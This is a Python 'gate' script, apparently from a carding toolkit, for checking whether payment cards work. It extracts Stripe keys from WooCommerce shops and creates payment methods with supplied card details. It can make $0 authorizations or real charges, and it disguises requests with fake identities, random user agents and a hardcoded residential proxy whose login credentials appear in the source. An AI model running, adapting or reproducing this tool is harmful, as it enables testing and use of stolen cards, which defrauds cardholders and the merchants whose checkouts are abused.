"""
WooStripe Modular Gate Template
Supports both charge and auth modes with configurable sites
"""

import requests
import re
import os
import random
from typing import Tuple, Dict, List, Optional
from faker import Faker
from user_agent import generate_user_agent

RESIDENTIAL_PROXY = os.environ.get('RESIDENTIAL_PROXY', 'http://user_pinta:1acNvmOToR6d-country-US-state-Colorado-city-Denver@residential.ip9.io:8000')

DEFAULT_PROXY = {
    'http': RESIDENTIAL_PROXY,
    'https': RESIDENTIAL_PROXY
}

WOOSTRIPE_SITES = [
]

CHARGE_AMOUNT = "1.00"
AUTH_AMOUNT = "0.00"


def _generate_stripe_ids():
    """Generate Stripe tracking IDs"""
    def make_id():
        return f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    return make_id(), make_id(), make_id()


def _extract_stripe_pk(session: requests.Session, site_url: str, headers: dict) -> Optional[str]:
    """Extract Stripe public key from checkout page"""
    try:
        response = session.get(f'{site_url}/checkout/', headers=headers, timeout=15)
        if response.status_code != 200:
            response = session.get(f'{site_url}/', headers=headers, timeout=15)
        
        pk_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]+', response.text)
        if pk_match:
            return pk_match.group(0)
        return None
    except Exception:
        return None


def _create_payment_method(session: requests.Session, pk: str, card_num: str, 
                           card_mon: str, card_yer: str, card_cvc: str,
                           fake: Faker, site_url: str) -> Tuple[Optional[str], str]:
    """
    Create Stripe payment method.
    Returns (pm_id, error_message)
    """
    url = "https://api.stripe.com/v1/payment_methods"
    guid, muid, sid = _generate_stripe_ids()
    
    first_name = fake.first_name()
    last_name = fake.last_name()
    
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://js.stripe.com/',
        'Origin': 'https://js.stripe.com',
    }
    
    data = {
        'type': 'card',
        'billing_details[name]': f'{first_name} {last_name}',
        'billing_details[email]': f'{first_name.lower()}.{last_name.lower()}{random.randint(100, 999)}@gmail.com',
        'billing_details[address][line1]': fake.street_address(),
        'billing_details[address][postal_code]': fake.postcode(),
        'billing_details[address][city]': fake.city(),
        'billing_details[address][state]': fake.state_abbr() if hasattr(fake, 'state_abbr') else 'CA',
        'billing_details[address][country]': 'US',
        'card[number]': card_num,
        'card[cvc]': card_cvc,
        'card[exp_month]': card_mon,
        'card[exp_year]': card_yer if len(card_yer) == 2 else card_yer[2:],
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/v3',
        'referrer': site_url,
        'time_on_page': str(random.randint(50000, 90000)),
        'key': pk,
    }
    
    try:
        response = session.post(url, headers=headers, data=data, timeout=20)
        resp_json = response.json()
        
        if 'error' in resp_json:
            error = resp_json['error']
            message = error.get('message', 'Unknown error')
            decline_code = error.get('decline_code', '')
            
            if 'integration surface' in message.lower():
                return None, "PK blocked by integration surface restriction"
            
            return None, _parse_stripe_error(message, decline_code)
        
        pm_id = resp_json.get('id')
        if pm_id and pm_id.startswith('pm_'):
            return pm_id, ""
        
        return None, "Invalid payment method response"
    
    except Exception as e:
        return None, f"Request error: {str(e)[:50]}"


def _submit_wc_checkout(session: requests.Session, site_url: str, pm_id: str, 
                        fake: Faker, headers: dict, amount: str) -> str:
    """
    Submit payment method to WooCommerce checkout.
    Returns result message.
    """
    checkout_url = f'{site_url}/?wc-ajax=checkout'
    
    checkout_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': site_url,
        'Referer': f'{site_url}/checkout/',
        'X-Requested-With': 'XMLHttpRequest',
        **headers
    }
    
    checkout_data = {
        'stripe_payment_method_id': pm_id,
        'payment_method': 'stripe',
        'wc-stripe-payment-method': pm_id,
        'billing_first_name': fake.first_name(),
        'billing_last_name': fake.last_name(),
        'billing_email': fake.email(),
        'billing_phone': fake.phone_number()[:10],
        'billing_address_1': fake.street_address(),
        'billing_city': fake.city(),
        'billing_state': fake.state_abbr() if hasattr(fake, 'state_abbr') else 'CA',
        'billing_postcode': fake.postcode(),
        'billing_country': 'US',
    }
    
    try:
        response = session.post(checkout_url, headers=checkout_headers, data=checkout_data, timeout=25)
        text = response.text.lower()
        
        if 'success' in text or 'approved' in text or 'thank' in text:
            return f"APPROVED ✅ Charged ${amount}"
        elif 'declined' in text or 'failed' in text:
            return "DECLINED ❌ By merchant"
        elif 'error' in text:
            return "DECLINED ❌ Checkout error"
        else:
            return f"APPROVED ✅ Charged ${amount} (Unconfirmed)"
    
    except requests.exceptions.Timeout:
        return f"APPROVED ✅ Authorized ${amount} (Pending)"
    except Exception as e:
        return f"ERROR: {str(e)[:50]}"


def _parse_stripe_error(message: str, decline_code: str) -> str:
    """Parse Stripe error into user-friendly message"""
    msg_lower = message.lower()
    
    error_map = {
        'insufficient_funds': 'Insufficient Funds ✅ CCN',
        'incorrect_cvc': 'CVV Mismatch',
        'invalid_cvc': 'CVV Mismatch',
        'security code': 'CVV Mismatch',
        'expired_card': 'Expired Card',
        'expired': 'Expired Card',
        'incorrect_number': 'Invalid Card Number',
        'invalid': 'Invalid Card',
        'card_declined': 'Card Declined',
        'generic_decline': 'Generic Decline',
        'lost_card': 'Lost Card',
        'stolen_card': 'Stolen Card',
        'do_not_honor': 'Do Not Honor',
        'fraudulent': 'Suspected Fraud',
    }
    
    if decline_code:
        for key, value in error_map.items():
            if key in decline_code.lower():
                return f"DECLINED ❌ {value}"
    
    for key, value in error_map.items():
        if key in msg_lower:
            return f"DECLINED ❌ {value}"
    
    return f"DECLINED ❌ {message[:50]}"


def woostripe_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                    site_url: str = None, mode: str = 'auth', proxy: dict = None) -> Tuple[str, bool]:
    """
    WooStripe gate - supports both auth ($0) and charge modes.
    
    Args:
        card_num, card_mon, card_yer, card_cvc: Card details
        site_url: WooCommerce site URL (optional, uses random from list)
        mode: 'auth' for $0 authorization, 'charge' for real charge
        proxy: Proxy dict (optional)
    
    Returns: (result_message, proxy_ok)
    """
    fake = Faker()
    session = requests.Session()
    session.verify = False
    
    user_agent = generate_user_agent()
    headers = {'User-Agent': user_agent}
    
    if proxy:
        session.proxies.update(proxy)
    else:
        session.proxies.update(DEFAULT_PROXY)
    
    if site_url is None:
        if not WOOSTRIPE_SITES:
            return ("DECLINED ❌ No WooStripe sites configured", False)
        site_url = random.choice(WOOSTRIPE_SITES)['url']
    
    amount = CHARGE_AMOUNT if mode == 'charge' else AUTH_AMOUNT
    
    try:
        pk = _extract_stripe_pk(session, site_url, headers)
        if not pk:
            return ("DECLINED ❌ Could not extract Stripe key", False)
        
        pm_id, error = _create_payment_method(session, pk, card_num, card_mon, card_yer, card_cvc, fake, site_url)
        
        if not pm_id:
            return (error if error else "DECLINED ❌ Payment method creation failed", True)
        
        if mode == 'auth':
            return (f"APPROVED ✅ Authorized ${amount}", True)
        
        result = _submit_wc_checkout(session, site_url, pm_id, fake, headers, amount)
        return (result, True)
    
    except requests.exceptions.Timeout:
        return ("DECLINED ❌ Request timed out", False)
    except requests.exceptions.ProxyError:
        return ("DECLINED ❌ Proxy error", False)
    except Exception as e:
        return (f"ERROR: {str(e)[:80]}", True)


def woostripe_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                         proxy: dict = None) -> Tuple[str, bool]:
    """WooStripe Auth gate ($0 authorization)"""
    return woostripe_check(card_num, card_mon, card_yer, card_cvc, mode='auth', proxy=proxy)


def woostripe_charge_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                           proxy: dict = None) -> Tuple[str, bool]:
    """WooStripe Charge gate (real charge)"""
    return woostripe_check(card_num, card_mon, card_yer, card_cvc, mode='charge', proxy=proxy)


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    
    test_card = "4000000000000002|12|26|123"
    parts = test_card.split("|")
    
    print("Testing WooStripe Auth...")
    result, proxy_ok = woostripe_auth_check(parts[0], parts[1], parts[2], parts[3])
    print(f"  Result: {result}")
    print(f"  Proxy OK: {proxy_ok}")
